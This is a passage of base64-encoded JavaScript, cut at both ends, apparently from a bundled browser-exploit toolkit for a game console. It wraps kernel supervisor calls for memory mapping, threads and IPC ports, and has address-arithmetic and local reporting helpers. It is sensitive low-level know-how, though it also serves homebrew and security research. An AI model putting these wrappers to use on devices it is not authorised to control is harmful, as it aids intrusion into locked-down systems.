oaWQsIGFyZ3MsIGR1bXBSZWdzKTtcblx0aWYgKHJldFswXSAhPT0gMCB8fCByZXRbMV0gIT09IDApIHtcblx0XHRyZXR1cm4gbmV3IFJlc3VsdC5FcnIobmV3IFJlc3VsdENvZGUocmV0KSk7XG5cdH0gZWxzZSB7XG5cdFx0cmV0dXJuIFJlc3VsdC5OdWxsT2s7XG5cdH1cbn07XG5cbi8qXG4gIFVzYWdlczpcbiAgc3ZjQ3JlYXRlVHJhbnNmZXJNZW1vcnkoc2l6ZSlcbiAgc3ZjQ3JlYXRlVHJhbnNmZXJNZW1vcnkoYXJyYXlCdWZmZXIpXG4gIHN2Y0NyZWF0ZVRyYW5zZmVyTWVtb3J5KGFkZHJlc3MsIHNpemUpXG4gIHN2Y0NyZWF0ZVRyYW5zZmVyTWVtb3J5KGFycmF5QnVmZmVyLCBwZXJtaXNzaW9uKVxuICBzdmNDcmVhdGVUcmFuc2Zlck1lbW9yeShhZGRyZXNzLCBzaXplLCBwZXJtaXNzaW9uKVxuKi9cbnN2Y01peGluLnN2Y0NyZWF0ZVRyYW5zZmVyTWVtb3J5ID0gZnVuY3Rpb24gKCkge1xuXHR2YXIgYWRkcmVzcztcblx0dmFyIHNpemU7XG5cdHZhciBwZXJtaXNzaW9uID0gMDtcblx0c3dpdGNoIChhcmd1bWVudHMubGVuZ3RoKSB7XG5cdGNhc2UgMDpcblx0XHR0aHJvdyBuZXcgRXJyb3IoJ2V4cGVjdGVkIGF0IGxlYXN0IG9uZSBhcmd1bWVudCcpO1xuXHRjYXNlIDE6XG5cdFx0aWYgKEFycmF5LmlzQXJyYXkoYXJndW1lbnRzWzBdKSB8fCB0eXBlb2YgKGFyZ3VtZW50c1swXSkgPT09ICdudW1iZXInKSB7XG5cdFx0XHRzaXplID0gYXJndW1lbnRzWzBdO1xuXHRcdFx0YnJlYWs7XG5cdFx0fVxuXHRcdGlmIChhcmd1bWVudHNbMF0gaW5zdGFuY2VvZiBBcnJheUJ1ZmZlcikge1xuXHRcdFx0aWYgKCF0aGlzLmlzQnJvd3Nlcikge1xuXHRcdFx0XHR0aHJvdyBuZXcgRXJyb3IoXCJkb24ndCB0cnkgdG8gbWFrZSB0cmFuc2ZlciBtZW1vcnkgd2l0aCBBcnJheUJ1ZmZlcnMgaWYgeW91J3JlIG5vdCB0aGUgYnJvd3NlciBwbGVhc2VcIik7XG5cdFx0XHR9XG5cdFx0XHRhZGRyZXNzID0gdGhpcy5nZXRBcnJheUJ1ZmZlckFkZHIoYXJndW1lbnRzWzBdKTtcblx0XHRcdHNpemUgPSBbYXJndW1lbnRzWzBdLmJ5dGVMZW5ndGgsIDBdO1xuXHRcdFx0YnJlYWs7XG5cdFx0fVxuXHRcdHRocm93IG5ldyBFcnJvcignaW52YWxpZCB1c2FnZSwgc2luZ2xlIGFyZ3VtZW50IGlzIGV4cGVjdGVkIHRvIGJlIGEgc2l6ZSwgdHlwZWQgYXJyYXksIG9yIEFycmF5QnVmZmVyJyk7XG5cdGNhc2UgMjpcblx0XHRpZiAoQXJyYXkuaXNBcnJheShhcmd1bWVudHNbMF0pKSB7XG5cdFx0XHRhZGRyZXNzID0gYXJndW1lbnRzWzBdO1xuXHRcdFx0c2l6ZSA9IGFyZ3VtZW50c1sxXTtcblx0XHRcdGJyZWFrO1xuXHRcdH1cblx0XHRpZiAoYXJndW1lbnRzWzBdIGluc3RhbmNlb2YgQXJyYXlCdWZmZXIpIHtcblx0XHRcdGlmICghdGhpcy5pc0Jyb3dzZXIpIHtcblx0XHRcdFx0dGhyb3cgbmV3IEVycm9yKFwiZG9uJ3QgdHJ5IHRvIG1ha2UgdHJhbnNmZXIgbWVtb3J5IHdpdGggQXJyYXlCdWZmZXJzIGlmIHlvdSdyZSBub3QgdGhlIGJyb3dzZXIgcGxlYXNlXCIpO1xuXHRcdFx0fVxuXHRcdFx0YWRkcmVzcyA9IHRoaXMuZ2V0QXJyYXlCdWZmZXJBZGRyKGFyZ3VtZW50c1swXSk7XG5cdFx0XHRzaXplID0gYXJndW1lbnRzWzBdLmJ5dGVMZW5ndGg7XG5cdFx0XHRwZXJtaXNzaW9uID0gYXJndW1lbnRzWzFdO1xuXHRcdFx0YnJlYWs7XG5cdFx0fVxuXHRcdHRocm93IG5ldyBFcnJvcignaW52YWxpZCB1c2FnZSwgZXhwZWN0ZWQgKGFkZHJlc3MsIHNpemUpIG9yIChhcnJheUJ1ZmZlciwgcGVybWlzc2lvbiknKTtcblx0Y2FzZSAzOlxuXHRcdGFkZHJlc3MgPSBhcmd1bWVudHNbMF07XG5cdFx0c2l6ZSA9IGFyZ3VtZW50c1sxXTtcblx0XHRwZXJtaXNzaW9uID0gYXJndW1lbnRzWzJdO1xuXHRcdGJyZWFrO1xuXHRkZWZhdWx0OlxuXHRcdHRocm93IG5ldyBFcnJvcignaW52YWxpZCB1c2FnZScpO1xuXHR9XG5cdGlmIChhZGRyZXNzID09PSB1bmRlZmluZWQpIHtcblx0XHRhZGRyZXNzID0gdGhpcy5tYWxsb2Moc2l6ZSk7XG5cdH1cblxuXHRhZGRyZXNzID0gdXRpbHMucGFkNjQoYWRkcmVzcyk7XG5cdHNpemUgPSB1dGlscy5wYWQ2NChzaXplKTtcblx0cGVybWlzc2lvbiA9IHV0aWxzLnBhZDY0KHBlcm1pc3Npb24pO1xuXG5cdHZhciBoYW5kbGVCdWZmZXIgPSBuZXcgVWludDMyQXJyYXkoMik7XG5cdHJldHVybiB0aGlzLnN2Y1dpdGhSZXN1bHQoMHgxNSwgW2hhbmRsZUJ1ZmZlciwgYWRkcmVzcywgc2l6ZSwgcGVybWlzc2lvbl0pLnJlcGxhY2VWYWx1ZShoYW5kbGVCdWZmZXJbMF0pO1xufTtcblxuLypcbiAgVXNhZ2VzOlxuICBzdmNDcmVhdGVTaGFyZWRNZW1vcnkoc2l6ZSlcbiAgc3ZjQ3JlYXRlU2hhcmVkTWVtb3J5KHNpemUsIHBlcm1pc3Npb24pXG4gIHN2Y0NyZWF0ZVNoYXJlZE1lbW9yeShzaXplLCBwZXJtaXNzaW9uMSwgcGVybWlzc2lvbjIpXG4qL1xuc3ZjTWl4aW4uc3ZjQ3JlYXRlU2hhcmVkTWVtb3J5ID0gZnVuY3Rpb24gKHNpemUsIHBlcm1pc3Npb24xLCBwZXJtaXNzaW9uMikge1xuXHRpZiAocGVybWlzc2lvbjEgPT09IHVuZGVmaW5lZCkge1xuXHRcdHBlcm1pc3Npb24xID0gMzsgLy8gUldcblx0fVxuXHRpZiAocGVybWlzc2lvbjIgPT09IHVuZGVmaW5lZCkge1xuXHRcdHBlcm1pc3Npb24yID0gcGVybWlzc2lvbjE7XG5cdH1cblxuXHRpZiAodHlwZW9mIChzaXplKSA9PT0gJ251bWJlcicpIHsgc2l6ZSA9IFtzaXplLCAwXTsgfVxuXHRpZiAodHlwZW9mIChwZXJtaXNzaW9uMSkgPT09ICdudW1iZXInKSB7IHBlcm1pc3Npb24xID0gW3Blcm1pc3Npb24xLCAwXTsgfVxuXHRpZiAodHlwZW9mIChwZXJtaXNzaW9uMikgPT09ICdudW1iZXInKSB7IHBlcm1pc3Npb24yID0gW3Blcm1pc3Npb24yLCAwXTsgfVxuXG5cdGlmICghQXJyYXkuaXNBcnJheShzaXplKSkgeyB0aHJvdyBuZXcgRXJyb3IoJ2ludmFsaWQgc2l6ZSB0eXBlJyk7IH1cblx0aWYgKCFBcnJheS5pc0FycmF5KHBlcm1pc3Npb24xKSkgeyB0aHJvdyBuZXcgRXJyb3IoJ2ludmFsaWQgcGVybWlzc2lvbjEgdHlwZScpOyB9XG5cdGlmICghQXJyYXkuaXNBcnJheShwZXJtaXNzaW9uMikpIHsgdGhyb3cgbmV3IEVycm9yKCdpbnZhbGlkIHBlcm1pc3Npb24yIHR5cGUnKTsgfVxuXG5cdHZhciBoYW5kbGVCdWZmZXIgPSBuZXcgVWludDMyQXJyYXkoMik7XG5cdHJldHVybiB0aGlzLnN2Y1dpdGhSZXN1bHQoMHg1MCwgW2hhbmRsZUJ1ZmZlciwgc2l6ZSwgcGVybWlzc2lvbjEsIHBlcm1pc3Npb24yXSkucmVwbGFjZVZhbHVlKGhhbmRsZUJ1ZmZlclswXSk7XG59O1xuXG4vKlxuICBVc2FnZXM6XG4gIHN2Y01hcFNoYXJlZE1lbW9yeShoYW5kbGUsIHNpemUpXG4gIHN2Y01hcFNoYXJlZE1lbW9yeShoYW5kbGUsIHNpemUsIHBlcm0pXG4gIHN2Y01hcFNoYXJlZE1lbW9yeShoYW5kbGUsIGFkZHIsIHNpemUsIHBlcm0pXG5cbiAgUmV0dXJuczpcbiAgTWFwcGVkIGFkZHJlc3NcbiAqL1xuc3ZjTWl4aW4uc3ZjTWFwU2hhcmVkTWVtb3J5ID0gZnVuY3Rpb24gKGhhbmRsZSkge1xuXHR2YXIgc2l6ZTtcblx0dmFyIGFkZHI7XG5cdHZhciBwZXJtID0gMztcblx0c3dpdGNoIChhcmd1bWVudHMubGVuZ3RoKSB7XG5cdGNhc2UgMzpcblx0XHRwZXJtID0gYXJndW1lbnRzWzJdO1xuXHRcdC8vIGZhbGx0aHJvdWdoXG5cdGNhc2UgMjpcblx0XHRzaXplID0gYXJndW1lbnRzWzFdO1xuXHRcdGFkZHIgPSB0aGlzLmZpbmRVbm1hcHBlZFJlZ2lvbihzaXplKTtcblx0XHRicmVhaztcblx0Y2FzZSA0OlxuXHRcdGFkZHIgPSBhcmd1bWVudHNbMV07XG5cdFx0c2l6ZSA9IGFyZ3VtZW50c1syXTtcblx0XHRwZXJtID0gYXJndW1lbnRzWzNdO1xuXHRcdGJyZWFrO1xuXHRkZWZhdWx0OlxuXHRcdHRocm93IG5ldyBFcnJvcignaW52YWxpZCB1c2FnZScpO1xuXHR9XG5cblx0cmV0dXJuIHRoaXMuc3ZjV2l0aFJlc3VsdCgweDEzLCBbaGFuZGxlLCBhZGRyLCBzaXplLCBwZXJtXSkucmVwbGFjZVZhbHVlKGFkZHIpO1xufTtcblxuLypcbiAgVXNhZ2VzOlxuICBzdmNNYXBUcmFuc2Zlck1lbW9yeShoYW5kbGUsIHNpemUpXG4gIHN2Y01hcFRyYW5zZmVyTWVtb3J5KGhhbmRsZSwgc2l6ZSwgcGVybSlcbiAgc3ZjTWFwVHJhbnNmZXJNZW1vcnkoaGFuZGxlLCBhZGRyLCBzaXplLCBwZXJtKVxuXG4gIFJldHVybnM6XG4gIE1hcHBlZCBhZGRyZXNzXG4gKi9cbnN2Y01peGluLnN2Y01hcFRyYW5zZmVyTWVtb3J5ID0gZnVuY3Rpb24gKGhhbmRsZSkge1xuXHR2YXIgc2l6ZTtcblx0dmFyIGFkZHI7XG5cdHZhciBwZXJtID0gMztcblx0c3dpdGNoIChhcmd1bWVudHMubGVuZ3RoKSB7XG5cdGNhc2UgMzpcblx0XHRwZXJtID0gYXJndW1lbnRzWzJdO1xuXHRcdC8vIGZhbGx0aHJvdWdoXG5cdGNhc2UgMjpcblx0XHRzaXplID0gYXJndW1lbnRzWzFdO1xuXHRcdGFkZHIgPSB0aGlzLmZpbmRVbm1hcHBlZFJlZ2lvbihzaXplKTtcblx0XHRicmVhaztcblx0Y2FzZSA0OlxuXHRcdGFkZHIgPSBhcmd1bWVudHNbMV07XG5cdFx0c2l6ZSA9IGFyZ3VtZW50c1syXTtcblx0XHRwZXJtID0gYXJndW1lbnRzWzNdO1xuXHRcdGJyZWFrO1xuXHRkZWZhdWx0OlxuXHRcdHRocm93IG5ldyBFcnJvcignaW52YWxpZCB1c2FnZScpO1xuXHR9XG5cblx0cmV0dXJuIHRoaXMuc3ZjV2l0aFJlc3VsdCgweDUxLCBbaGFuZGxlLCBhZGRyLCBzaXplLCBwZXJtXSkucmVwbGFjZVZhbHVlKGFkZHIpO1xufTtcblxuc3ZjTWl4aW4uc3ZjVW5tYXBUcmFuc2Zlck1lbW9yeSA9IGZ1bmN0aW9uIChoYW5kbGUsIGFkZHIsIHNpemUpIHtcblx0cmV0dXJuIHRoaXMuc3ZjV2l0aFJlc3VsdCgweDUyLCBbaGFuZGxlLCBhZGRyLCBzaXplXSk7XG59O1xuXG5zdmNNaXhpbi5zdmNHZXRTeXN0ZW1UaWNrID0gZnVuY3Rpb24gKCkge1xuXHR2YXIgaW5mbyA9IG5ldyBVaW50MzJBcnJheSgyKTtcblx0cmV0dXJuIHRoaXMuc3ZjV2l0aFJlc3VsdCgweDI5LCBbaW5mbywgMTAsIDAsIFsweEZGRkZGRkZGLCAweEZGRkZGRkZGXV0pLnJlcGxhY2VWYWx1ZShbaW5mb1swXSwgaW5mb1sxXV0pOyAvLyBHZXRTeXN0ZW1UaWNrXG59O1xuXG5zdmNNaXhpbi5zdmNRdWVyeU1lbSA9IGZ1bmN0aW9uIChhZGRyLCByYXcpIHtcblx0aWYgKGFyZ3VtZW50cy5sZW5ndGggPT09IDEpIHsgcmF3ID0gZmFsc2U7IH1cblxuXHR2YXIgbWVtaW5mbyA9IG5ldyBVaW50MzJBcnJheSgxMik7XG5cdHZhciBwYWdlaW5mbyA9IG5ldyBVaW50MzJBcnJheSgyKTtcblxuXHR2YXIgbWVtcGVybXMgPSBbJ05PTkUnLCAnUicsICdXJywgJ1JXJywgJ1gnLCAnUlgnLCAnV1gnLCAnUldYJ107XG5cdHZhciBtZW1zdGF0ZXMgPSBbJ05PTkUnLCAnKDEpJywgJygyKScsICdDT0RFLVNUQVRJQycsICdDT0RFJywgJ0hFQVAnLCAnU0hBUkVELU1FTS1CTE9DSycsICdNT0RVTEUtQ09ERS1TVEFUSUMnLCAnTU9EVUxFLUNPREUnLCAnU1RBQ0stTUlSUk9SJywgJ1RIUkVBRC1MT0NBTC1TVE9SQUdFJywgJ01FTU9SWV9NSVJST1InLCAnKDE1KScsICdSRVNFUlZFRCddO1xuXHRyZXR1cm4gdGhpcy5zdmNXaXRoUmVzdWx0KDB4NiwgW21lbWluZm8sIHBhZ2VpbmZvLCBhZGRyXSkubWFwKCgpID0+IHtcblx0XHR2YXIgbXMgPSBtZW1pbmZvWzRdO1xuXHRcdGlmICghcmF3ICYmIG1zIDwgbWVtc3RhdGVzLmxlbmd0aCkgeyBtcyA9IG1lbXN0YXRlc1ttc107IH0gZWxzZSBpZiAoIXJhdykgeyBtcyA9ICdVTktOT1dOJzsgfVxuXHRcdHZhciBtcCA9IG1lbWluZm9bNl07XG5cdFx0aWYgKCFyYXcgJiYgbXAgPCBtZW1wZXJtcy5sZW5ndGgpIHsgbXAgPSBtZW1wZXJtc1ttcF07IH1cbiAgICBcblx0XHRyZXR1cm4gW1ttZW1pbmZvWzBdLCBtZW1pbmZvWzFdXSwgW21lbWluZm9bMl0sIG1lbWluZm9bM11dLCBtcywgbXAsIFtwYWdlaW5mb1swXSwgcGFnZWluZm9bMV1dXTtcblx0fSk7XG59O1xuXG5zdmNNaXhpbi5zdmNDbG9zZUhhbmRsZSA9IGZ1bmN0aW9uIChoYW5kbGUpIHtcblx0cmV0dXJuIHRoaXMuc3ZjV2l0aFJlc3VsdCgweDE2LCBbaGFuZGxlXSk7XG59O1xuXG5zdmNNaXhpbi5zdmNDb25uZWN0VG9Qb3J0ID0gZnVuY3Rpb24gKHBvcnROYW1lKSB7XG5cdHZhciBoYW5kbGVCdWZmZXIgPSBuZXcgVWludDMyQXJyYXkoMik7XG5cdHZhciByZXQgPSB0aGlzLnN2Y1dpdGhSZXN1bHQoMHgxRiwgW2hhbmRsZUJ1ZmZlciwgdXRpbHMuc3RyMmFiKHBvcnROYW1lKV0pLnJlcGxhY2VWYWx1ZShbaGFuZGxlQnVmZmVyWzBdLCBoYW5kbGVCdWZmZXJbMV1dKTtcblx0cmV0dXJuIHJldDtcbn07XG5cbnN2Y01peGluLnN2Y1NlbmRTeW5jUmVxdWVzdFdpdGhVc2VyQnVmZmVyID0gZnVuY3Rpb24gKGFkZHIsIHNpemUsIGhhbmRsZSkge1xuXHRyZXR1cm4gdGhpcy5zdmNXaXRoUmVzdWx0KDB4MjIsIFthZGRyLCBzaXplLCBoYW5kbGVdKTtcbn07XG5cbnN2Y01peGluLnN2Y0NyZWF0ZVRocmVhZCA9IGZ1bmN0aW9uIChlbnRyeSwgYXJnLCBzdGFja3RvcCwgcHJpbywgcHJvY2Vzc29ySWQpIHtcblx0dmFyIGhhbmRsZUJ1ZmZlciA9IG5ldyBVaW50MzJBcnJheSgyKTtcblx0cmV0dXJuIHRoaXMuc3ZjV2l0aFJlc3VsdCgweDgsIFtoYW5kbGVCdWZmZXIsIGVudHJ5LCBhcmcsIHN0YWNrdG9wLCBwcmlvLCBwcm9jZXNzb3JJZF0pLnJlcGxhY2VWYWx1ZShbaGFuZGxlQnVmZmVyWzBdLCBoYW5kbGVCdWZmZXJbMV1dKTtcbn07XG5cbnN2Y01peGluLnN2Y1N0YXJ0VGhyZWFkID0gZnVuY3Rpb24gKGhhbmRsZSkge1xuXHRyZXR1cm4gdGhpcy5zdmNXaXRoUmVzdWx0KDB4OSwgW2hhbmRsZV0pO1xufTtcblxuc3ZjTWl4aW4uc3ZjQWNjZXB0U2Vzc2lvbiA9IGZ1bmN0aW9uIChwb3J0KSB7XG5cdHZhciBoYW5kbGVCdWZmZXIgPSBuZXcgVWludDMyQXJyYXkoMik7XG5cdHJldHVybiB0aGlzLnN2Y1dpdGhSZXN1bHQoMHg0MSwgW2hhbmRsZUJ1ZmZlciwgcG9ydF0pLnJlcGxhY2VWYWx1ZShoYW5kbGVCdWZmZXJbMF0pO1xufTtcblxuc3ZjTWl4aW4uc3ZjUmVwbHlBbmRSZWNlaXZlV2l0aFVzZXJCdWZmZXIgPSBmdW5jdGlvbiAoYnVmLCBoYW5kbGVzLCByZXBseSwgdGltZW91dCkge1xuXHR2YXIgaGFuZGxlSWR4QnVmZmVyID0gbmV3IFVpbnQzMkFycmF5KDIpO1xuXHRyZXR1cm4gdGhpcy5zdmNXaXRoUmVzdWx0KDB4NDQsIFtoYW5kbGVJZHhCdWZmZXIsIGJ1ZiwgYnVmLmJ5dGVMZW5ndGgsIGhhbmRsZXMgPyBuZXcgVWludDMyQXJyYXkoaGFuZGxlcykgOiAwLCBoYW5kbGVzID8gaGFuZGxlcy5sZW5ndGggOiAwLCByZXBseSwgdGltZW91dF0pLnJlcGxhY2VWYWx1ZShoYW5kbGVJZHhCdWZmZXJbMF0pO1xufTtcblxuc3ZjTWl4aW4uc3ZjV2FpdFN5bmNocm9uaXphdGlvbiA9IGZ1bmN0aW9uIChoYW5kbGVzLCB0aW1lb3V0KSB7XG5cdHZhciBoYW5kbGVzQnVmZmVyID0gbmV3IFVpbnQzMkFycmF5KGhhbmRsZXMpO1xuXHR2YXIgaGFuZGxlSWR4QnVmZmVyID0gbmV3IFVpbnQzMkFycmF5KDEpO1xuXHRyZXR1cm4gdGhpcy5zdmNXaXRoUmVzdWx0KDB4MTgsIFtoYW5kbGVJZHhCdWZmZXIsIGhhbmRsZXNCdWZmZXIsIGhhbmRsZXNCdWZmZXIubGVuZ3RoLCB0aW1lb3V0XSkucmVwbGFjZVZhbHVlKGhhbmRsZUlkeEJ1ZmZlclswXSk7XG59XG5cbm1vZHVsZS5leHBvcnRzID0gc3ZjTWl4aW47XG4iLCIvKiBlc2xpbnQgbm8tZ2xvYmFsLWFzc2lnbjogXCJvZmZcIiAqL1xuLyogZ2xvYmFsIFhNTEh0dHBSZXF1ZXN0ICovXG52YXIgREVCVUcgPSBmYWxzZTtcblxudmFyIHV0aWxzID0gZXhwb3J0cztcblxuZXhwb3J0cy5wYWRkciA9IGZ1bmN0aW9uIHBhZGRyIChsbywgaGkpIHtcblx0aWYgKGFyZ3VtZW50cy5sZW5ndGggPT09IDEpIHtcblx0XHRoaSA9IGxvWzFdO1xuXHRcdGxvID0gbG9bMF07XG5cdH1cblx0dmFyIHNsbyA9ICgnMDAwMDAwMDAnICsgbG8udG9TdHJpbmcoMTYpKS5zbGljZSgtOCk7XG5cdHZhciBzaGkgPSAoJzAwMDAwMDAwJyArIGhpLnRvU3RyaW5nKDE2KSkuc2xpY2UoLTgpO1xuXHRyZXR1cm4gJzB4JyArIHNoaSArIHNsbztcbn07XG5cbmV4cG9ydHMucGFyc2VBZGRyID0gZnVuY3Rpb24gcGFyc2VBZGRyIChhZGRyKSB7XG5cdGFkZHIgPSBcIjAwMDAwMDAwMDAwMDAwMDBcIiArIGFkZHIucmVwbGFjZSgnMHgnLCAnJyk7XG5cdGFkZHIgPSBhZGRyLnNsaWNlKGFkZHIubGVuZ3RoIC0gMTYpO1xuXHR2YXIgYXJyID0gW2FkZHIuc2xpY2UoMCwgOCksIGFkZHIuc2xpY2UoOCwgMTYpXTtcblx0dmFyIGhpID0gcGFyc2VJbnQoYXJyWzBdLCAxNik7XG5cdHZhciBsbyA9IHBhcnNlSW50KGFyclsxXSwgMTYpO1xuXHRyZXR1cm4gWyBsbywgaGkgXTtcbn07XG5cbmV4cG9ydHMubnVsbHB0ciA9IGZ1bmN0aW9uIG51bGxwdHIgKGFkZHIpIHtcblx0cmV0dXJuIGFkZHJbMF0gPT09IDAgJiYgYWRkclsxXSA9PT0gMDtcbn07XG5cbmV4cG9ydHMuZXEgPSBmdW5jdGlvbiBlcSAoYSwgYikge1xuXHRyZXR1cm4gYVswXSA9PT0gYlswXSAmJiBhWzFdID09PSBiWzFdO1xufTtcblxuZXhwb3J0cy5hZGQyID0gZnVuY3Rpb24gYWRkMiAoYWRkciwgb2ZmKSB7XG5cdGlmICh0eXBlb2Ygb2ZmID09PSAnbnVtYmVyJykge1xuXHRcdGlmIChvZmYgPj0gMCkge1xuXHRcdFx0b2ZmID0gW29mZiwgMF07XG5cdFx0fSBlbHNlIHtcblx0XHRcdG9mZiA9IFsoMHhGRkZGRkZGRiArIG9mZiArIDEpID4+PiAwLCAweEZGRkZGRkZGXTtcblx0XHR9XG5cdH1cblxuXHR2YXIgYWxvID0gYWRkclswXTtcblx0dmFyIGFoaSA9IGFkZHJbMV07XG5cdHZhciBibG8gPSBvZmZbMF07XG5cdHZhciBiaGkgPSBvZmZbMV07XG5cblx0dmFyIG5sbyA9ICgoYWxvICsgYmxvKSAmIDB4RkZGRkZGRkYpID4+PiAwO1xuXHR2YXIgbmhpID0gKChhaGkgKyBiaGkpICYgMHhGRkZGRkZGRikgPj4+IDA7XG5cblx0aWYgKChubG8gPCBhbG8gJiYgYmxvID4gMCkgfHwgKG5sbyA9PT0gYWxvICYmIGJsbyAhPT0gMCkpIHtcblx0XHRuaGkgPSAoKG5oaSArIDEpICYgMHhGRkZGRkZGRikgPj4+IDA7XG5cdH0gZWxzZSBpZiAobmxvID4gYWxvICYmIGJsbyA8IDApIHtcblx0XHRuaGkgPSAoKG5oaSAtIDEpICYgMHhGRkZGRkZGRikgPj4+IDA7XG5cdH1cblxuXHRyZXR1cm4gW25sbywgbmhpXTtcbn07XG5cbmV4cG9ydHMuc3ViMiA9IGZ1bmN0aW9uIHN1YjIgKGFkZHIsIG9mZikge1xuXHRpZiAodHlwZW9mIG9mZiA9PT0gJ251bWJlcicpIHtcblx0XHRpZiAob2ZmID49IDApIHtcblx0XHRcdG9mZiA9IFtvZmYsIDBdO1xuXHRcdH0gZWxzZSB7XG5cdFx0XHRvZmYgPSBbKDB4RkZGRkZGRkYgKyBvZmYgKyAxKSA+Pj4gMCwgMHhGRkZGRkZGRl07XG5cdFx0fVxuXHR9XG5cblx0b2ZmID0gZXhwb3J0cy5hZGQyKFtvZmZbMF0gXiAweEZGRkZGRkZGLCBvZmZbMV0gXiAweEZGRkZGRkZGXSwgMSk7XG5cdHJldHVybiBleHBvcnRzLmFkZDIoYWRkciwgb2ZmKTtcbn07XG5cbmV4cG9ydHMuc2VuZCA9IGZ1bmN0aW9uIHNlbmQgKGVwLCBkYXRhKSB7XG5cdHZhciBtc2cgPSB7XG5cdFx0bXNnOiBkYXRhXG5cdH07XG5cdHZhciBqc29uc3RyID0gSlNPTi5zdHJpbmdpZnkobXNnKTtcblx0dHJ5IHtcblx0XHR2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7XG5cdFx0eGhyLm9wZW4oJ1BPU1QnLCAnLycgKyBlcCwgZmFsc2UpO1xuXHRcdHhoci5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpO1xuXHRcdHhoci5zZW5kKGpzb25zdHIpO1xuXHR9IGNhdGNoIChlKSB7XG5cblx0fVxufTtcblxuZXhwb3J0cy5wdXNoQ2FjaGUgPSBmdW5jdGlvbiBwdXNoQ2FjaGUgKGNhY2hlKSB7XG5cdGV4cG9ydHMuc2VuZCgnY2FjaGUnLCBjYWNoZSk7XG59O1xuXG5leHBvcnRzLmRsb2cgPSBmdW5jdGlvbiBkbG9nIChtc2cpIHtcblx0aWYgKERFQlVHKSB7XG5cdFx0bG9nKG1zZyk7XG5cdH1cbn07XG5cbmV4cG9ydHMudG9IZXggPSBmdW5jdGlvbiAoZCkge1xuXHRyZXR1cm4gZC50b1N0cmluZygxNik7XG59O1xuXG4vKlxuICBleGFtcGxlOlxuICB1dGlscy5wYWNrQml0ZmllbGQoW1xuICAgIHt0YXJnZXRCZWdpbjogMTYsIHNpemU6IDR9LFxuICAgIHt0YXJnZXRCZWdpbjogMjAsIHRhcmdldEVuZDogMjR9LFxuICAgIHt0YXJnZXRCZWdpbjogMjQsIHNpemU6IDQsIHNvdXJjZUJlZ2luOiAyfV0sIFs1LCA2LCA3XSlcbiAqL1xuZXhwb3J0cy5wYWNrQml0ZmllbGQgPSBmdW5jdGlvbiAoc3BlYywgdmFsdWVzKSB7XG5cdHZhciBiaXRmaWVsZCA9IDA7XG5cdGlmKHNwZWMubGVuZ3RoICE9PSB2YWx1ZXMubGVuZ3RoKSB7XG5cdFx0dGhyb3cgXCJiaXRmaWVsZCBzcGVjIGRvZXNuJ3QgbWF0Y2ggbnVtYmVyIG9mIHByb3ZpZGVkIHZhbHVlc1wiO1xuXHR9XG5cdGZvcih2YXIgaSA9IDA7IGkgPCBzcGVjLmxlbmd0aDsgaSsrKSB7XG5cdFx0dmFyIHMgPSBzcGVjW2ldO1xuXHRcdHZhciB2ID0gdmFsdWVzW2ldO1xuICAgIFxuXHRcdHZhciB0YiA9IHMudGFyZ2V0QmVnaW47XG5cdFx0dmFyIHRlO1xuXHRcdHZhciBzYiA9IHMuc291cmNlQmVnaW4gPT09IHVuZGVmaW5lZCA/IDAgOiBzLnNvdXJjZUJlZ2luO1xuXHRcdHZhciBzZTtcblx0XHR2YXIgc2l6ZTtcblx0XHRpZihzLnRhcmdldEVuZCAmJiAhcy5zaXplICYmICFzLnNvdXJjZUVuZCkge1xuXHRcdFx0dGUgPSBzLnRhcmdldEVuZDtcblx0XHRcdHNpemUgPSBzLnRhcmdldEVuZCAtIHRiO1xuXHRcdFx0c2UgPSBzYiArIHNpemU7XG5cdFx0fSBlbHNlIGlmKHMuc2l6ZSAmJiAhcy50YXJnZXRFbmQgJiYgIXMuc291cmNlRW5kKSB7XG5cdFx0XHR0ZSA9IHMudGFyZ2V0QmVnaW4gKyBzLnNpemU7XG5cdFx0XHRzZSA9IHNiICsgcy5zaXplO1xuXHRcdFx0c2l6ZSA9IHMuc2l6ZTtcblx0XHR9IGVsc2UgaWYocy5zb3VyY2VFbmQgJiYgIXMuc2l6ZSAmJiAhcy50YXJnZXRFbmQpIHtcblx0XHRcdHNlID0gcy5zb3VyY2VFbmQ7XG5cdFx0XHRzaXplID0gcy5zb3VyY2VFbmQgLSBzYjtcblx0XHRcdHRlID0gcy50YiArIHNpemU7XG5cdFx0fSBlbHNlIGlmKHMudGFyZ2V0RW5kIC0gdGIgPT09IHMuc291cmNlRW5kIC0gc2IpIHtcblx0XHRcdHNpemUgPSBzLnRhcmdldEVuZCAtIHRiO1xuXHRcdFx0aWYocy5zaXplICYmIHMuc2l6ZSAhPT0gc2l6ZSkge1xuXHRcdFx0XHR0aHJvdyBcInNpemUgZG9lcyBub3QgbWF0Y2hcIjtcblx0XHRcdH1cblx0XHR9IGVsc2Uge1xuXHRcdFx0dGhyb3cgXCJiaXRmaWVsZCBzcGVjIG51bWJlciBcIiArIGkgKyBcIiBuZWVkcyBvbmUgb2YgdGFyZ2V0RW5kLCBzaXplLCBvciBzb3VyY2VFbmRcIjtcblx0XHR9XG5cblx0XHRiaXRmaWVsZCA9IGJpdGZpZWxkIHwgKCgodiA+PiBzYikgJiAoKDE8PHNpemUpLTEpKSA8PCB0Yik7XG5cdH1cblxuXHRyZXR1cm4gYml0ZmllbGQ7XG59O1xuXG5leHBvcnRzLnVucGFja0JpdGZpZWxkID0gZnVuY3Rpb24gKHNwZWMsIGJpdGZpZWxkKSB7XG5cdHJldHVybiBzcGVjLm1hcCgocykgPT4ge1xuXHRcdHZhciB0YiA9IHMudGFyZ2V0QmVnaW47XG5cdFx0dmFyIHRlO1xuXHRcdHZhciBzYiA9IHMuc291cmNlQmVnaW4gPT09IHVuZGVmaW5lZCA/IDAgOiBzLnNvdXJjZUJlZ2luO1xuXHRcdHZhciBzZTtcblx0XHR2YXIgc2l6ZTtcblx0XHRpZihzLnRhcmdldEVuZCAmJiAhcy5zaXplICYmICFzLnNvdXJjZUVuZCkge1xuXHRcdFx0dGUgPSBzLnRhcmdldEVuZDtcblx0XHRcdHNpemUgPSBzLnRhcmdldEVuZCAtIHRiO1xuXHRcdFx0c2UgPSBzYiArIHNpemU7XG5cdFx0fSBlbHNlIGlmKHMuc2l6ZSAmJiAhcy50YXJnZXRFbmQgJiYgIXMuc291cmNlRW5kKSB7XG5cdFx0XHR0ZSA9IHMudGFyZ2V0QmVnaW4gKyBzLnNpemU7XG5cdFx0XHRzZSA9IHNi